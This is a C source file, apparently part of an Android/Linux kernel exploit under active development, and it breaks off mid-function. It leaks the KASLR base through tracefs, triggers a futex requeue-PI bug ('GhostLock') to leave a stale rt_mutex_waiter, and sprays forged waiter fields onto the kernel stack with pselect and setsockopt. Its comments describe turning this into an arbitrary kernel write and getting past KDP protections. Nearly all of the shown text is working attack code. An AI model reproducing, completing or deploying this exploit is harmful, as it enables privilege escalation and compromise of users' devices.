#include "common.h"

#define SLIDE_MAX_ATTEMPTS 20
#define SLIDE_CONSUME_DELAY 2000
#define SLIDE_CONSUME_USEC 0
#ifndef SLIDE_PSELECT_NFDS
#define SLIDE_PSELECT_NFDS PSELECT_ROUTE_NFDS
#endif
#define SLIDE_PSELECT_PAD_BYTES 0
#ifndef SLIDE_PSELECT_WORD_SHIFT
#define SLIDE_PSELECT_WORD_SHIFT 0
#endif
#ifndef SLIDE_WAIT_SECONDS
#define SLIDE_WAIT_SECONDS 30
#endif

#ifdef TARGET_A15
/* A15 shell belongs to readtracefs and can read sched_blocked_reason's raw
 * caller pointer. Two unrelated, exact-Image callers cross-check the slide. */
#define SLIDE_TRACEFS_EVENT_ID 108
#define SLIDE_TRACEFS_MAX_SLIDE 0x1f0000ULL
#define SLIDE_TRACEFS_STEP 0x8000ULL
#define SLIDE_TRACEFS_WORKER_OFF 0x0010db0cULL /* worker_thread + 0x78 */
#define SLIDE_TRACEFS_RCU_OFF 0x001d7358ULL    /* rcu_gp_fqs_loop + 0x188 */
#define SLIDE_TRACEFS_CPUS 8
#define SLIDE_TRACEFS_PAGE 4096

struct slide_tracefs_counts {
  unsigned worker[63];
  unsigned rcu[63];
};

static uint16_t slide_tracefs_get16(const unsigned char *p) {
  return (uint16_t)p[0] | ((uint16_t)p[1] << 8);
}

static uint32_t slide_tracefs_get32(const unsigned char *p) {
  return (uint32_t)p[0] | ((uint32_t)p[1] << 8) |
         ((uint32_t)p[2] << 16) | ((uint32_t)p[3] << 24);
}

static uint64_t slide_tracefs_get64(const unsigned char *p) {
  uint64_t value = 0;
  for (int i = 7; i >= 0; i--)
    value = (value << 8) | p[i];
  return value;
}

static int slide_tracefs_read_int(const char *path, int *value) {
  char buf[32] = {0};
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0)
    return 0;
  ssize_t n = read(fd, buf, sizeof(buf) - 1);
  close(fd);
  if (n <= 0)
    return 0;
  *value = atoi(buf);
  return 1;
}

static int slide_tracefs_write_text(const char *path, const char *value) {
  int fd = open(path, O_WRONLY | O_CLOEXEC);
  if (fd < 0)
    return 0;
  size_t len = strlen(value);
  ssize_t n = write(fd, value, len);
  close(fd);
  return n == (ssize_t)len;
}

static void slide_tracefs_parse_page(
    const unsigned char *page, struct slide_tracefs_counts *counts) {
  uint64_t commit = slide_tracefs_get64(page + 8) & 0x3fffffffULL;
  size_t end = 16 + (size_t)commit;
  if (end > SLIDE_TRACEFS_PAGE)
    end = SLIDE_TRACEFS_PAGE;

  /* Event data begins after the 4-byte ring header. Its caller field is at
   * offset 16, and type_len=8 for this 28-byte event record. */
  for (size_t event = 20; event + 24 <= end; event += 4) {
    uint32_t ring_header = slide_tracefs_get32(page + event - 4);
    if ((ring_header & 0x1f) != 8 ||
        slide_tracefs_get16(page + event) != SLIDE_TRACEFS_EVENT_ID)
      continue;
    uint64_t caller = slide_tracefs_get64(page + event + 16);
    for (unsigned s = 0; s < 63; s++) {
      uint64_t base = KIMAGE_TEXT_BASE + (uint64_t)s * SLIDE_TRACEFS_STEP;
      if (caller == base + SLIDE_TRACEFS_WORKER_OFF)
        counts->worker[s]++;
      if (caller == base + SLIDE_TRACEFS_RCU_OFF)
        counts->rcu[s]++;
    }
  }
}

static void slide_tracefs_drain_cpu(
    unsigned cpu, struct slide_tracefs_counts *counts) {
  char path[128];
  snprintf(path, sizeof(path),
           "/sys/kernel/tracing/per_cpu/cpu%u/trace_pipe_raw", cpu);
  int fd = open(path, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
  if (fd < 0)
    return;
  unsigned char page[SLIDE_TRACEFS_PAGE];
  for (int i = 0; i < 32; i++) {
    ssize_t n = read(fd, page, sizeof(page));
    if (n < 0) {
      if (errno == EINTR)
        continue;
      break;
    }
    if (n == 0)
      break;
    if (n == sizeof(page))
      slide_tracefs_parse_page(page, counts);
  }
  close(fd);
}
#endif

uint64_t slide_tracefs_leak_kernel_base(void) {
#ifdef TARGET_A15
  char on_path[] = "/sys/kernel/tracing/tracing_on";
  char event_path[] =
      "/sys/kernel/tracing/events/sched/sched_blocked_reason/enable";
  char id_path[] =
      "/sys/kernel/tracing/events/sched/sched_blocked_reason/id";
  int was_on = -1, event_was_on = -1, event_id = -1;
  if (!slide_tracefs_read_int(on_path, &was_on) ||
      !slide_tracefs_read_int(event_path, &event_was_on) ||
      !slide_tracefs_read_int(id_path, &event_id) || was_on != 0 ||
      event_was_on != 0 || event_id != SLIDE_TRACEFS_EVENT_ID) {
    pr_warning("tracefs slide unavailable or tracing already active\n");
    return 0;
  }

  if (!slide_tracefs_write_text(event_path, "1\n") ||
      !slide_tracefs_write_text(on_path, "1\n")) {
    slide_tracefs_write_text(on_path, "0\n");
    slide_tracefs_write_text(event_path, "0\n");
    pr_warning("tracefs slide could not enable sched_blocked_reason\n");
    return 0;
  }

  struct timespec delay = {.tv_sec = 1, .tv_nsec = 0};
  while (nanosleep(&delay, &delay) && errno == EINTR) {}

  int stopped = slide_tracefs_write_text(on_path, "0\n");
  int disabled = slide_tracefs_write_text(event_path, "0\n");
  if (!stopped || !disabled) {
    pr_warning("tracefs slide could not restore tracing state\n");
    return 0;
  }

  struct slide_tracefs_counts counts;
  memset(&counts, 0, sizeof(counts));
  for (unsigned cpu = 0; cpu < SLIDE_TRACEFS_CPUS; cpu++)
    slide_tracefs_drain_cpu(cpu, &counts);

  int found = -1;
  for (int s = 0; s < 63; s++) {
    if (counts.worker[s] && counts.rcu[s]) {
      if (found >= 0) {
        pr_warning("tracefs slide ambiguous candidates\n");
        return 0;
      }
      found = s;
    }
  }
  if (found < 0) {
    pr_warning("tracefs slide lacked both caller anchors\n");
    return 0;
  }

  uint64_t base = KIMAGE_TEXT_BASE + (uint64_t)found * SLIDE_TRACEFS_STEP;
  pr_success("tracefs KASLR slide verified base=%016llx slide=%016llx "
             "worker_hits=%u rcu_hits=%u\n",
             (unsigned long long)base,
             (unsigned long long)(base - KIMAGE_TEXT_BASE),
             counts.worker[found], counts.rcu[found]);
  return base;
#else
  return 0;
#endif
}

static uint32_t slide_f_wait;
static uint32_t slide_f_pi_target;
static uint32_t slide_f_pi_chain;
static atomic_int slide_waiter_ready;
static atomic_int slide_waiter_waiting;
static atomic_int slide_owner_started;
static atomic_int slide_mcast_requeue_ret;
static atomic_int slide_mcast_requeue_errno;
static atomic_int slide_route_done;
static atomic_int slide_waiter_tid;
static atomic_int slide_consume_calls;
static atomic_int slide_consume_go;
static atomic_int slide_consume_seen;
static atomic_int slide_consume_lost;
static atomic_int slide_consume_enter_sched;
static atomic_int slide_consume_stop;
static atomic_int slide_consume_sched_ok;
static atomic_int slide_consume_last_sched_ret;
static atomic_int slide_consume_last_sched_errno;
static atomic_int slide_consume_wait_copy;
static atomic_int slide_mcast_copy_ready;
static atomic_int slide_mcast_attempted;
static atomic_int slide_mcast_write_verified;
static atomic_int slide_mcast_copied;
static atomic_int slide_mcast_custom_route;
static uintptr_t slide_mcast_custom_target;
static uintptr_t slide_mcast_custom_value;
int tracefs_slide_verified;

int slide_pselect_words_per_set(void) {
  int bits_per_word = (int)(8 * sizeof(unsigned long));
  return (SLIDE_PSELECT_NFDS + bits_per_word - 1) / bits_per_word;
}

int slide_pselect_global_word(int waiter_word) {
  /* NOTE: PSELECT_SHIFT never tuned this stage — it only drives the fops.c
   * write primitive (which runs after slide-kaslr-ok). The slide shift was
   * always the compile-time SLIDE_PSELECT_WORD_SHIFT (A17's value, 2).
   * Tune the slide shift with SLIDE_PSHIFT. Geometry: NFDS=320 -> 5 words
   * per set, 3 sets -> global words 0..14 placeable. The 11-word waiter has
   * nonzero words 0,2,3,5,6,7,8; all must land in 0..14, so the only
   * placeable shifts are 0..6. Anything else panics by construction. */
  int shift = env_int_range("SLIDE_PSHIFT", SLIDE_PSELECT_WORD_SHIFT, -14, 14);
  return shift + waiter_word;
}

int slide_pselect_put_global_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int global_word, uint64_t value) {
  if (global_word < 0) {
    return 0;
  }

  int set_idx = global_word / words_per_set;
  int word_idx = global_word % words_per_set;
  switch (set_idx) {
    case 0:
      fdset_put_word(in, word_idx, value);
      return 1;
    case 1:
      fdset_put_word(out, word_idx, value);
      return 1;
    case 2:
      fdset_put_word(ex, word_idx, value);
      return 1;
    default:
      return 0;
  }
}

uint64_t slide_pselect_get_global_word(
    const fd_set *in, const fd_set *out, const fd_set *ex,
    int words_per_set, int global_word) {
  if (global_word < 0) {
    return 0;
  }

  int set_idx = global_word / words_per_set;
  int word_idx = global_word % words_per_set;
  switch (set_idx) {
    case 0:
      return fdset_get_word(in, word_idx);
    case 1:
      return fdset_get_word(out, word_idx);
    case 2:
      return fdset_get_word(ex, word_idx);
    default:
      return 0;
  }
}

void slide_pselect_put_waiter_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int waiter_word, uint64_t value, const char *name) {
  int global_word = slide_pselect_global_word(waiter_word);
  int placed = slide_pselect_put_global_word(
      in, out, ex, words_per_set, global_word, value);
  if (!placed) {
    pr_warning("slide pselect cannot place %s waiter_word=%d global_word=%d "
               "words_per_set=%d nfds=%d\n",
               name, waiter_word, global_word, words_per_set,
               SLIDE_PSELECT_NFDS);
  }
}

void prepare_slide_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
  FD_ZERO(in);
  FD_ZERO(out);
  FD_ZERO(ex);

  int words_per_set = slide_pselect_words_per_set();
  pr_info("slide pselect shift=%d nfds=%d words_per_set=%d (SLIDE_PSHIFT env)\n",
          env_int_range("SLIDE_PSHIFT", SLIDE_PSELECT_WORD_SHIFT, -14, 14),
          SLIDE_PSELECT_NFDS, words_per_set);
  struct slide_waiter_word {
    int word;
    uint64_t value;
    const char *name;
  }
#ifdef TARGET_A15
  /* 5.15 rt_mutex_waiter: no pi_prio/pi_deadline; prio shares a word
   * with wake_state. Slid pointers go in tree/pi_tree slots for the
   * KASLR oracle. */
  words[] = {
    {0, SLIDE_LOGGERS_0_1, "tree_pc"},
    {1, 0, "tree_right"},
    {2, SLIDE_RANDOM_BOOT_ID_DATA, "tree_left"},
    {3, SLIDE_LOGGERS_0_1, "pi_parent"},
    {4, 0, "pi_right"},
    {5, SLIDE_RANDOM_BOOT_ID_DATA, "pi_left"},
    {6, SLIDE_INIT_TASK, "task"},
    {7, fake_lock, "lock"},
    {8, ((uint64_t)FAKE_WAITER_PRIO << 32) | 3, "wake_state|prio"},
    {9, 0, "deadline"},
    {10, 0, "ww_ctx"},
  };
#else
  words[] = {
    {0, SLIDE_LOGGERS_0_1, "tree_pc"},
    {1, 0, "tree_right"},
    {2, SLIDE_RANDOM_BOOT_ID_DATA, "tree_left"},
    {3, FAKE_WAITER_PRIO, "tree_prio"},
    {5, SLIDE_LOGGERS_0_1, "pi0"},
    {6, 0, "pi1"},
    {7, SLIDE_RANDOM_BOOT_ID_DATA, "pi2"},
    {8, FAKE_WAITER_PRIO, "pi_prio"},
    {9, 0, "pi_deadline"},
    {10, SLIDE_INIT_TASK, "task"},
    {11, fake_lock, "lock"},
    {12, 3, "wake_state"},
    {13, 0, "ww_ctx"},
  };
#endif
  for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
    struct slide_waiter_word *w = &words[i];
    slide_pselect_put_waiter_word(
        in, out, ex, words_per_set, w->word, w->value, w->name);
  }
}

void open_slide_selected_fds(fd_set *in, fd_set *out, fd_set *ex, int read_fd) {
  for (int fd = 0; fd < SLIDE_PSELECT_NFDS; fd++) {
    if (FD_ISSET(fd, in) || FD_ISSET(fd, out) || FD_ISSET(fd, ex)) {
      dup2(read_fd, fd);
    }
  }
  dup2(read_fd, SLIDE_PSELECT_NFDS - 1);
  FD_SET(SLIDE_PSELECT_NFDS - 1, ex);
}

void slide_pselect_stack_copy(void) {
  if (!page_base || !fake_lock || !fake_w0) {
    pr_error("slide pselect missing kernel page base=%016zx lock=%016zx w0=%016zx\n",
             page_base, fake_lock, fake_w0);
    return;
  }

  int pipefd[2] = {-1, -1};
  SYSCHK(pipe(pipefd));
  int block_fd = (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);
  if (block_fd < 0) {
    pr_warning("slide timerfd_create failed errno=%d; using pipe read end\n",
               errno);
    block_fd = pipefd[0];
  }
  int high_read = fcntl(block_fd, F_DUPFD, SLIDE_PSELECT_NFDS + 16);
  if (high_read < 0) {
    pr_error("slide pselect F_DUPFD read errno=%d\n", errno);
    if (block_fd != pipefd[0]) {
      close(block_fd);
    }
    close(pipefd[0]);
    close(pipefd[1]);
    return;
  }

  fd_set in;
  fd_set out;
  fd_set ex;
  prepare_slide_pselect_fdsets(&in, &out, &ex);
  open_slide_selected_fds(&in, &out, &ex, high_read);

  atomic_store(&slide_consume_stop, 0);
  atomic_store(&slide_consume_go, 0);
  atomic_store(&slide_consume_seen, 0);
  atomic_store(&slide_consume_lost, 0);
  atomic_store(&slide_consume_enter_sched, 0);
  atomic_store(&slide_consume_calls, 0);
  atomic_store(&slide_consume_sched_ok, 0);
  atomic_store(&slide_consume_last_sched_ret, -1);
  atomic_store(&slide_consume_last_sched_errno, 0);
  atomic_store(&slide_consume_wait_copy, 0);
  atomic_store(&slide_mcast_copy_ready, 0);

  atomic_store(&slide_consume_go, 1);
  errno = 0;

#ifndef SLIDE_PSELECT_TIMEOUT_SEC
#define SLIDE_PSELECT_TIMEOUT_SEC PSELECT_TIMEOUT_SEC
#endif
#ifdef SLIDE_USE_SELECT
  struct timeval tv = { .tv_sec = SLIDE_PSELECT_TIMEOUT_SEC, .tv_usec = 0 };
  int ret = select(SLIDE_PSELECT_NFDS, &in, &out, &ex, &tv);
#else
  struct timespec timeout = {
    .tv_sec = SLIDE_PSELECT_TIMEOUT_SEC,
    .tv_nsec = 0,
  };
  struct timespec *timeoutp = &timeout;
  int ret = pselect(SLIDE_PSELECT_NFDS, &in, &out, &ex, timeoutp, NULL);
#endif
  int saved_errno = errno;
  atomic_store(&slide_consume_go, 0);
  pr_info("slide pselect returned ret=%d errno=%d calls=%d sched_ok=%d "
          "last_sched_ret=%d last_sched_errno=%d\n",
          ret, saved_errno, atomic_load(&slide_consume_calls),
          atomic_load(&slide_consume_sched_ok),
          atomic_load(&slide_consume_last_sched_ret),
          atomic_load(&slide_consume_last_sched_errno));

  close(high_read);
  if (block_fd != pipefd[0]) {
    close(block_fd);
  }
  close(pipefd[0]);
  close(pipefd[1]);
}

/* ---- MCAST stack writer (A15-ported) ----
 * setsockopt(MCAST_JOIN_SOURCE_GROUP, buf, 0x108) copies user bytes to the
 * caller's kernel stack. This firmware's callback frames total 0x390 bytes;
 * the copy interval is E-0x350..E-0x248 (E = syscall-entry SP). The static
 * futex model predicts waiter offset 0x78. The offset-0x68 dump supports 0x78
 * for that run, and two 0x78 runs reported boot_id readback. Actual KP44–KP48
 * dumps show no stamp markers at the consumed waiter's fields.
 * A separate older crash file was mislabeled KP44 and cannot calibrate the
 * offset. Keep 0x78 as the best-supported default, not a repeatably verified
 * placement. See MCAST-RUNS-2026-10-21.md.
 *
 * BTF places rt_mutex_waiter.task/lock/wake_state at +0x30/+0x38/+0x40. The
 * join deliberately returns -EADDRNOTAVAIL for AF_UNSPEC after the 0x108-byte
 * copy. The consumer is gated on that return; the writer then uses userspace
 * atomics and yield instructions while the consumer triggers the PI walk.
 * The code avoids explicit syscalls in that interval. KP44–KP48 do not
 * establish that the copied bytes remain at the expected waiter fields.
 *
 * The firmware rejects AF_UNSPEC before multicast join dispatch, so lingering
 * joined-state is not an established retry limit. */
#define MCAST_STAMP_LEN 0x108
#define MCAST_WAITER_OFF 0x78
#define MCAST_GSR_GROUP_FAMILY_OFF 0x08
#define MCAST_SPIN_ITERS 200000000
#ifndef MCAST_JOIN_SOURCE_GROUP
#define MCAST_JOIN_SOURCE_GROUP 46
#endif
#ifndef IPPROTO_IPV6
#define IPPROTO_IPV6 41
#endif

void slide_mcast_put_waiter_word(
    unsigned char *stamp, size_t waiter_off, int waiter_word,
    uint64_t value, const char *name) {
  size_t off = waiter_off + (size_t)waiter_word * 8;
  if (off + 8 > MCAST_STAMP_LEN) {
    pr_warning("slide mcast cannot place %s waiter_word=%d off=%zu\n",
               name, waiter_word, off);
    return;
  }
  memcpy(stamp + off, &value, 8);
}

void slide_mcast_stack_copy(void) {
  if (!page_base || !fake_lock || !fake_w0) {
    pr_error("slide mcast missing kernel page base=%016zx lock=%016zx w0=%016zx\n",
             page_base, fake_lock, fake_w0);
    return;
  }

  unsigned char stamp[MCAST_STAMP_LEN];
  memset(stamp, 0, sizeof(stamp));
  size_t waiter_off = (size_t)env_int_range(
      "SLIDE_MCAST_WAITER_OFF", MCAST_WAITER_OFF,
      0, MCAST_STAMP_LEN - 0x58);

  /* 5.15 rt_mutex_waiter, 11 words.
   * Write-primitive mechanism test (write-primitive-research.md).
   * CORRECTION (2026-10-09): the firing rb_erase takes x0 = waiter (struct
   * base), so the erased node is the TREE rb_node — the write uses w0 (value)
   * and w2 (address), NOT w3/w5. Disassembly-proven + confirmed by BuSung's
   * production source (tree_parent = fake_fops). With w1=0, w2!=0, Case 2 does
   *   Write 1: [w2] = w0            (arbitrary address, attacker value)
   *   Write 2: [w0&~3 + 8/16] = w2  (collateral -> own page when w0 is ours)
   * then returns with NO __rb_erase_color (no rebalancing).
   * KDP: the linear/direct map is NOT protected (Track A, high confidence);
   * BuSung's KDP-device chain does zero canonical-.data writes, routing every
   * .data target through its P0 linear-map alias.
   * Mechanism test (no KASLR needed): w0 = page_base+0x180, w2 =
   * page_base+0x100. Both are in the prepared page, and are deliberately
   * distinct so this exercises a non-self-pointer store. Surviving this path
   * is only a liveness signal; it does not prove the store without readback.
   * SLIDE_MCAST_REDIRECT=0 targets the boot_id data alias while keeping the
   * value and reciprocal-store collateral in our page. The boot_id readback
   * can verify the store, but this probe does not derive a KASLR slide.
   * Requires the zeroed fake_lock page (SLIDE_ZERO_LOCK=1, see util.c) so the
   * post-erase walk takes the benign tail (Track D). */
  int custom_route = atomic_load(&slide_mcast_custom_route);
  int mcast_redirect = env_flag("SLIDE_MCAST_REDIRECT", 1);
  uint64_t mcast_tree_pc = custom_route
      ? slide_mcast_custom_value : page_base + 0x180;
  uint64_t mcast_tree_left = custom_route
      ? slide_mcast_custom_target
      : (mcast_redirect ? page_base + 0x100
                        : data_addr(SLIDE_RANDOM_BOOT_ID_DATA_IMAGE));
  if (!custom_route && !mcast_redirect) {
    pr_warning("slide MCAST write probe will replace boot_id's first 8 bytes; "
               "the next boot generates a fresh boot_id\n");
  }
  pr_info("slide mcast redirect=%d custom=%d waiter_off=%03zx tree_pc=%016llx "
          "tree_left=%016llx "
          "(write: [w2]=w0)\n",
          mcast_redirect, custom_route, waiter_off,
          (unsigned long long)mcast_tree_pc,
          (unsigned long long)mcast_tree_left);
  if (env_flag("SLIDE_MCAST_NULL", 0)) {
    /* Null test: w0=w1=w2=0. rb_erase takes Case 1, so NEITHER Case-2 store
     * fires. If the walk survives, the stores were the crash site. If it
     * still panics, the crash is independent of the stores (prologue,
     * re-insert, owner tail, or descent) — get the oops PC. */
    mcast_tree_pc = 0;
    mcast_tree_left = 0;
    pr_info("slide mcast NULL TEST active: w0=w1=w2=0\n");
  }
  struct slide_mcast_word {
    int word;
    uint64_t value;
    const char *name;
  } words[] = {
    {0, mcast_tree_pc, "tree_pc"},
    {1, 0, "tree_right"},
    {2, mcast_tree_left, "tree_left"},
    {3, 0, "pi_parent"},
    {4, 0, "pi_right"},
    {5, 0, "pi_left"},
    {6, text_addr(INIT_TASK), "task"},
    {7, fake_lock, "lock"},
    {8, ((uint64_t)FAKE_WAITER_PRIO << 32) | 3, "wake_state|prio"},
    {9, 0, "deadline"},
    {10, 0, "ww_ctx"},
  };
  for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
    struct slide_mcast_word *w = &words[i];
    slide_mcast_put_waiter_word(
        stamp, waiter_off, w->word, w->value, w->name);
  }

  /* Deliberately fail the join (AF_UNSPEC group family -> -EADDRNOTAVAIL).
   * The 264-byte copy lands on the kernel stack BEFORE validation. */
  {
    uint16_t fam = AF_UNSPEC;
    memcpy(stamp + MCAST_GSR_GROUP_FAMILY_OFF, &fam, sizeof(fam));
  }

  /* socket() runs BEFORE the spray: its own stack use is irrelevant, but it
   * must not run after the stamp lands. */
  int sock = socket(AF_INET6, SOCK_DGRAM, 0);
  if (sock < 0) {
    pr_error("slide mcast socket(AF_INET6,SOCK_DGRAM) failed errno=%d\n",
             errno);
    return;
  }

  atomic_store(&slide_consume_stop, 0);
  atomic_store(&slide_consume_go, 0);
  atomic_store(&slide_consume_seen, 0);
  atomic_store(&slide_consume_lost, 0);
  atomic_store(&slide_consume_enter_sched, 0);
  atomic_store(&slide_consume_calls, 0);
  atomic_store(&slide_consume_sched_ok, 0);
  atomic_store(&slide_consume_last_sched_ret, -1);
  atomic_store(&slide_consume_last_sched_errno, 0);
  atomic_store(&slide_consume_wait_copy, 1);
  atomic_store(&slide_mcast_copy_ready, 0);

  int writer_only = custom_route
      ? 0 : env_flag("SLIDE_MCAST_WRITER_ONLY", 0);
  atomic_store(&slide_consume_go, 1);
  errno = 0;
  atomic_store(&slide_mcast_attempted, 1);
  int ret = setsockopt(sock, IPPROTO_IPV6, MCAST_JOIN_SOURCE_GROUP,
                       stamp, MCAST_STAMP_LEN);
  int saved_errno = errno;
  int copied = ret == -1 && saved_errno == EADDRNOTAVAIL;
  atomic_store(&slide_mcast_copied, copied);
  if (copied && writer_only) {
    /* Isolate the MCAST stack copy from the PI walk. The consumer is already
     * parked behind slide_mcast_copy_ready, so dropping go/setting stop makes
     * it exit without calling sched_setattr on the stale waiter. */
    atomic_store(&slide_consume_go, 0);
    atomic_store(&slide_consume_stop, 1);
    pr_info("slide mcast writer-only: PI consumer skipped\n");
  } else if (copied) {
    atomic_store(&slide_mcast_copy_ready, 1);
  } else {
    /* Do not run the PI consumer unless the expected post-copy validation
     * failure confirms that setsockopt reached the family check. */
    atomic_store(&slide_consume_go, 0);
    atomic_store(&slide_consume_stop, 1);
  }

  /* After the expected copy, use only userspace atomics and yield until the
   * consumer has touched the stale waiter. Logging here would issue a write
   * syscall on this same thread and can overwrite the stack window. */
  for (int spin = 0; spin < MCAST_SPIN_ITERS; spin++) {
    if (atomic_load(&slide_consume_stop)) {
      break;
    }
    __asm__ volatile("yield" ::: "memory");
  }
  atomic_store(&slide_consume_go, 0);
  /* Let the consumer observe go==0 and exit — yield only, no syscalls. */
  for (int spin = 0; spin < 1000000; spin++) {
    __asm__ volatile("yield" ::: "memory");
  }

  /* The touch already happened; stack reuse from here on is fine. */
  atomic_store(&slide_consume_wait_copy, 0);
  pr_info("slide mcast setsockopt ret=%d errno=%d copied=%d (expect -1/%d)\n",
          ret, saved_errno, copied, EADDRNOTAVAIL);
  if (!copied) {
    pr_warning("slide mcast unexpected result; PI touch skipped\n");
  }
  pr_info("slide mcast done calls=%d sched_ok=%d last_sched_ret=%d "
          "last_sched_errno=%d\n",
          atomic_load(&slide_consume_calls),
          atomic_load(&slide_consume_sched_ok),
          atomic_load(&slide_consume_last_sched_ret),
          atomic_load(&slide_consume_last_sched_errno));
  close(sock);
}

void *slide_consumer_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  pin_to_core(CONSUMER_CORE);

  int seen = 0;
  for (;;) {
    int seq = atomic_load(&slide_consume_go);
    if (seq == 0 || seq == seen) {
      __asm__ volatile("yield" ::: "memory");
      if (atomic_load(&slide_consume_stop)) {
        return NULL;
      }
      continue;
    }

    seen = seq;
    atomic_store(&slide_consume_seen, seen);
    if (atomic_load(&slide_consume_wait_copy)) {
      while (atomic_load(&slide_consume_go) == seq &&
             !atomic_load(&slide_mcast_copy_ready)) {
        __asm__ volatile("yield" ::: "memory");
      }
      if (atomic_load(&slide_consume_go) != seq ||
          !atomic_load(&slide_mcast_copy_ready)) {
        continue;
      }
    } else if (SLIDE_CONSUME_USEC) {
      usleep(SLIDE_CONSUME_USEC);
    } else {
      for (int spin = 0; spin < SLIDE_CONSUME_DELAY; spin++) {
        __asm__ volatile("yield" ::: "memory");
      }
    }
    if (atomic_load(&slide_consume_go) != seq) {
      int lost = atomic_load(&slide_consume_lost) + 1;
      atomic_store(&slide_consume_lost, lost);
      continue;
    }

    /* MCAST releases this consumer only after setsockopt has returned, so
     * adding the pselect delay needlessly leaves the stack copy exposed to
     * further activity. Keep the historical delay for the pselect route. */
    if (seq == 1 && !atomic_load(&slide_mcast_attempted)) {
      usleep(PSELECT_ENTER_DELAY_USEC);
    }

    int tid = atomic_load(&slide_waiter_tid);
    int calls = atomic_load(&slide_consume_calls);
    int entered = atomic_load(&slide_consume_enter_sched) + 1;
    atomic_store(&slide_consume_enter_sched, entered);
    atomic_store(&slide_consume_calls, calls + 1);
    errno = 0;
    long ret = sched_setattr_tid(tid, (calls % 19) + 1);
    int saved_errno = errno;
    atomic_store(&slide_consume_last_sched_ret, (int)ret);
    atomic_store(&slide_consume_last_sched_errno, saved_errno);
    if (ret == 0) {
      int sched_ok = atomic_load(&slide_consume_sched_ok) + 1;
      atomic_store(&slide_consume_sched_ok, sched_ok);
    }
    atomic_store(&slide_consume_stop, 1);
    while (atomic_load(&slide_consume_go)) {
      __asm__ volatile("yield" ::: "memory");
    }
    return NULL;
  }
}

#ifdef TARGET_A15
/* The original GhostLock trigger deliberately forms a PI cycle:
 * waiter owns slide_f_pi_chain; owner owns slide_f_pi_target and blocks on
 * slide_f_pi_chain; CMP_REQUEUE_PI then tries to move waiter onto the target.
 * The expected result is EDEADLK rollback, which is the vulnerable path being
 * exercised. The chain WAITERS bit confirms the owner actually queued before
 * the parent attempts the requeue. */
static int slide_wait_for_chain_waiter(void) {
  for (int ms = 0; ms < SLIDE_WAIT_SECONDS * 1000; ms++) {
    uint32_t chain = __atomic_load_n(&slide_f_pi_chain, __ATOMIC_ACQUIRE);
    if (chain & FUTEX_WAITERS) {
      return 1;
    }
    usleep(1000);
  }
  return 0;
}
#endif

void *slide_waiter_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  /* The MCAST PI trigger updates this task's scheduler state from a separate
   * consumer thread. If the two run on different CPUs, a remote reschedule
   * can enter this task while rt_mutex_adjust_prio_chain is following the
   * stale stack waiter, racing its lock-field check against the later reload.
   * An opt-in same-CPU mode serializes target execution with that PI walk:
   * while the consumer runs sched_setattr, this waiter cannot execute on a
   * second CPU and re-enter its kernel stack. This is a mitigation hypothesis
   * for the observed check/reload discrepancy, not a proven fix. */
  if (atomic_load(&slide_mcast_custom_route) &&
      env_flag("A15_MCAST_SERIALIZE_PI_CORE", 0)) {
    pin_to_core(CONSUMER_CORE);
    pr_info("slide MCAST waiter pinned to consumer core=%d\n",
            CONSUMER_CORE);
  }
  int tid = (int)SYSCHK(syscall(SYS_gettid));
  atomic_store(&slide_waiter_tid, tid);

  if (futex_op(&slide_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("slide waiter lock chain errno=%d\n", errno);
    return NULL;
  }

  atomic_store(&slide_waiter_ready, 1);
  while (!atomic_load(&slide_owner_started)) {
    usleep(1000);
  }

  struct timespec timeout;
  SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
  timeout.tv_sec += SLIDE_WAIT_SECONDS;

  atomic_store(&slide_waiter_waiting, 1);
#ifdef TARGET_A15
  errno = 0;
  long wait_ret = futex_op(&slide_f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
                           &slide_f_pi_target, 0);
  int wait_errno = errno;
  int requeue_ret = atomic_load(&slide_mcast_requeue_ret);
  int requeue_errno = atomic_load(&slide_mcast_requeue_errno);
  /* GhostLock needs the intentional cyclic-chain rollback, not a successful
   * requeue. EDEADLK means the proxy waiter hit the cycle; on the source-wait
   * path, the waiter then times out without entering the successful-requeue
   * cleanup path. Refuse MCAST unless both the rollback and timeout occurred.
   * This proves the trigger branch only; it does not prove the stale waiter
   * fields, fake page contents, or target write. */
  if (requeue_ret != -1 || requeue_errno != EDEADLK ||
      wait_ret != -1 || wait_errno != ETIMEDOUT) {
    pr_warning("slide MCAST PI handoff rejected requeue=%d/%d "
               "wait=%ld/%d\n",
               requeue_ret, requeue_errno, wait_ret, wait_errno);
    atomic_store(&slide_route_done, 1);
    return NULL;
  }
  pr_info("slide MCAST PI handoff confirmed requeue=%d wait=%ld/%d\n",
          requeue_ret, wait_ret, wait_errno);

  /* MCAST stack writer (mcast-writer-analysis.md). The static model and the
   * 2026-10-21 offset-0x68 dump support 0x78, and one 0x78 run reported
   * boot_id readback. Actual KP44/KP45/KP46 dumps show no stamp markers at the
   * consumed waiter's fields. A separate older crash file was mislabeled
   * KP44 and cannot calibrate the offset. Neither offset is repeatably
   * validated. */
  slide_mcast_stack_copy();
#else
  futex_op(&slide_f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
           &slide_f_pi_target, 0);
  futex_op(&slide_f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  slide_pselect_stack_copy();
#endif
  atomic_store(&slide_route_done, 1);

  for (;;) {
    sleep(1);
  }
}

void *slide_owner_thread(void *arg __attribute__((unused))) {
  if (futex_op(&slide_f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("slide owner lock target errno=%d\n", errno);
    return NULL;
  }

  while (!atomic_load(&slide_waiter_ready)) {
    usleep(1000);
  }

  atomic_store(&slide_owner_started, 1);
  errno = 0;
  long chain_ret = futex_op(&slide_f_pi_chain, FUTEX_LOCK_PI, 0, NULL,
                            NULL, 0);
  if (chain_ret != 0) {
